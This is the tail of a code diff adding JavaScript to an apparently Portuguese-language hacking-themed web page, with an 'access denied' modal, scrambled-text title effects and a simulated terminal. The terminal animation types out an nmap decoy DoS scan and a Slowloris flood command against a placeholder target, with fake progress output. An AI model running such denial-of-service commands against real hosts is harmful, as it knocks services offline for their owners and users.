+            accessDeniedModal.style.position = 'fixed';
+            accessDeniedModal.style.top = '50%';
+            accessDeniedModal.style.left = '50%';
+            accessDeniedModal.style.transform = 'translate(-50%, -50%)';
+            accessDeniedModal.style.background = 'rgba(20, 20, 20, 0.95)';
+            accessDeniedModal.style.border = '2px solid #ff1493';
+            accessDeniedModal.style.borderRadius = '10px';
+            accessDeniedModal.style.padding = '30px';
+            accessDeniedModal.style.zIndex = '9999';
+            accessDeniedModal.style.textAlign = 'center';
+            accessDeniedModal.style.boxShadow = '0 0 30px rgba(255, 20, 147, 0.5)';
+            accessDeniedModal.style.maxWidth = '90%';
+            accessDeniedModal.style.width = '400px';
+            
+            accessDeniedModal.innerHTML = `
+                <h3 style="color: #ff1493; font-size: 24px; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 2px;">Acesso Negado</h3>
+                <p style="color: #fff; margin-bottom: 20px; font-size: 16px;">ID não cadastrado. Você não tem permissão para acessar esta área.</p>
+                <button id="closeAccessDenied" style="background: linear-gradient(45deg, #ff1493, #ff69b4); border: none; padding: 10px 20px; color: #fff; border-radius: 5px; font-weight: 600; cursor: pointer; transition: all 0.3s ease;">Entendi</button>
+            `;
+            
+            document.body.appendChild(accessDeniedModal);
+            
+            document.getElementById('closeAccessDenied').addEventListener('click', function() {
+                accessDeniedModal.style.display = 'none';
+            });
+            
+            const allLinks = document.querySelectorAll('a:not(#top-btn):not(.toc-list a)');
+            
+            function showAccessDenied(e) {
+                if (this.classList.contains('home-btn') || this.href.includes('#')) {
+                    return;
+                }
+                
+                e.preventDefault();
+                e.stopPropagation();
+                accessDeniedModal.style.display = 'block';
+            }
+            
+            allLinks.forEach(function(link) {
+                link.addEventListener('click', showAccessDenied);
+            });
+            
+            // Adiciona acesso negado para outros elementos interativos
+            const allButtons = document.querySelectorAll('button:not(#closeAccessDenied):not(.tab-btn):not(.copy-btn)');
+            
+            allButtons.forEach(function(button) {
+                button.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    accessDeniedModal.style.display = 'block';
+                });
+            });
+        });
+
+        // Funções para detalhamento técnico das ferramentas
+        const expandButtons = document.querySelectorAll('.expand-btn');
+        if (expandButtons) {
+            expandButtons.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    const targetId = btn.getAttribute('data-target');
+                    const targetElement = document.getElementById(targetId);
+                    
+                    if (targetElement.style.display === 'none' || !targetElement.style.display) {
+                        targetElement.style.display = 'block';
+                        btn.innerHTML = '<i class="fas fa-minus-circle"></i> Ocultar Detalhes';
+                    } else {
+                        targetElement.style.display = 'none';
+                        btn.innerHTML = '<i class="fas fa-plus-circle"></i> Mostrar Detalhes';
+                    }
+                });
+            });
+        }
+
+        // Animação de digitação para o terminal
+        function typeEffect(element, text, i = 0, speed = 50) {
+            if (i < text.length) {
+                element.innerHTML += text.charAt(i);
+                i++;
+                setTimeout(() => typeEffect(element, text, i, speed), speed);
+            }
+        }
+
+        // Efeito de "hackeamento" para elementos selecionados
+        function hackEffect(element) {
+            const originalText = element.textContent;
+            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+~`|}{[]\\:;?><,./-=";
+            let iteration = 0;
+            
+            const interval = setInterval(() => {
+                element.textContent = originalText.split("")
+                    .map((letter, index) => {
+                        if (index < iteration) {
+                            return originalText[index];
+                        }
+                        return chars[Math.floor(Math.random() * chars.length)];
+                    })
+                    .join("");
+                
+                if (iteration >= originalText.length) {
+                    clearInterval(interval);
+                }
+                
+                iteration += 1 / 3;
+            }, 30);
+        }
+
+        // Aplicar efeito "hacker" aos títulos quando visíveis na tela
+        const hackElements = document.querySelectorAll('.attack-name, .defense-name, .tool-name');
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    hackEffect(entry.target);
+                    observer.unobserve(entry.target);
+                }
+            });
+        }, { threshold: 0.5 });
+
+        hackElements.forEach(element => {
+            observer.observe(element);
+        });
+        
+        // Script para exibir o terminal simulado com comandos
+        document.addEventListener('DOMContentLoaded', () => {
+            const terminalBody = document.querySelector('.terminal-body');
+            if (terminalBody) {
+                // Limpa qualquer conteúdo existente
+                let lastLine = terminalBody.children[terminalBody.children.length - 1];
+                
+                // Simula digitação em "tempo real"
+                setTimeout(() => {
+                    const newLine = document.createElement('div');
+                    newLine.className = 'terminal-line';
+                    newLine.innerHTML = '<span class="terminal-prompt">hacker@cyberhack:~$</span> <span class="terminal-command"></span>';
+                    terminalBody.insertBefore(newLine, lastLine);
+                    
+                    const cmdSpan = newLine.querySelector('.terminal-command');
+                    typeEffect(cmdSpan, 'nmap -sS -D RND:10 --script dos [IP-ALVO]', 0, 60);
+                    
+                    setTimeout(() => {
+                        const outputLine = document.createElement('div');
+                        outputLine.className = 'terminal-line terminal-output';
+                        outputLine.innerHTML = 'Iniciando scan DoS em [IP-ALVO]...<br>Detectando serviços vulneráveis...<br>Identificados possíveis vetores: 80/tcp, 443/tcp, 53/udp';
+                        terminalBody.insertBefore(outputLine, lastLine);
+                        
+                        setTimeout(() => {
+                            const newLine2 = document.createElement('div');
+                            newLine2.className = 'terminal-line';
+                            newLine2.innerHTML = '<span class="terminal-prompt">hacker@cyberhack:~$</span> <span class="terminal-command"></span>';
+                            terminalBody.insertBefore(newLine2, lastLine);
+                            
+                            const cmdSpan2 = newLine2.querySelector('.terminal-command');
+                            typeEffect(cmdSpan2, 'python3 slowloris.py [IP-ALVO] -s 500 -v', 0, 60);
+                            
+                            setTimeout(() => {
+                                const outputLine2 = document.createElement('div');
+                                outputLine2.className = 'terminal-line terminal-output';
+                                outputLine2.innerHTML = 'Slowloris iniciado com 500 sockets<br>Conectando ao alvo: [IP-ALVO]<br>Conexões estabelecidas: 500/500<br>Alvo respondendo lentamente...';
+                                terminalBody.insertBefore(outputLine2, lastLine);
+                            }, 2000);
+                        }, 3000);
+                    }, 2000);
+                }, 1000);
+            }
+        });
+        
+        // Ativar todos os tooltips na página
+        const tooltipTriggers = document.querySelectorAll('[data-tooltip]');
+        if (tooltipTriggers) {
+            tooltipTriggers.forEach(trigger => {
+                trigger.addEventListener('mouseenter', (e) => {
+                    const tooltipText = e.target.getAttribute('data-tooltip');
+                    
+                    const tooltip = document.createElement('div');
+                    tooltip.className = 'tooltip';
+                    tooltip.textContent = tooltipText;
+                    
+                    tooltip.style.position = 'absolute';
+                    tooltip.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
+                    tooltip.style.color = '#fff';
+                    tooltip.style.padding = '8px 12px';
+                    tooltip.style.borderRadius = '4px';
+                    tooltip.style.fontSize = '14px';
+                    tooltip.style.zIndex = '1000';
+                    tooltip.style.boxShadow = '0 2px 10px rgba(0, 0, 0, 0.3)';
+                    tooltip.style.top = `${e.target.offsetTop - 40}px`;
+                    tooltip.style.left = `${e.target.offsetLeft + e.target.offsetWidth / 2}px`;
+                    tooltip.style.transform = 'translateX(-50%)';
+                    
+                    document.body.appendChild(tooltip);
+                    
+                    trigger.addEventListener('mouseleave', () => {
+                        tooltip.remove();
+                    });
+                });
+            });
+        }
+    </script>
+
+    <div id="accessDeniedModal" class="access-denied" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(20, 20, 20, 0.95); border: 2px solid #ff1493; border-radius: 10px; padding: 30px; z-index: 9999; text-align: center; box-shadow: 0 0 30px rgba(255, 20, 147, 0.5); max-width: 90%; width: 400px;">
+        <h3 style="color: #ff1493; font-size: 24px; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 2px;">Acesso Negado</h3>
+        <p style="color: #fff; margin-bottom: 20px; font-size: 16px;">ID não cadastrado. Você não tem permissão para acessar esta área.</p>
+        <button id="closeAccessDenied" style="background: linear-gradient(45deg, #ff1493, #ff69b4); border: none; padding: 10px 20px; color: #fff; border-radius: 5px; font-weight: 600; cursor: pointer; transition: all 0.3s ease;">Entendi</button>
+    </div>
+</body>
+</html>
+                
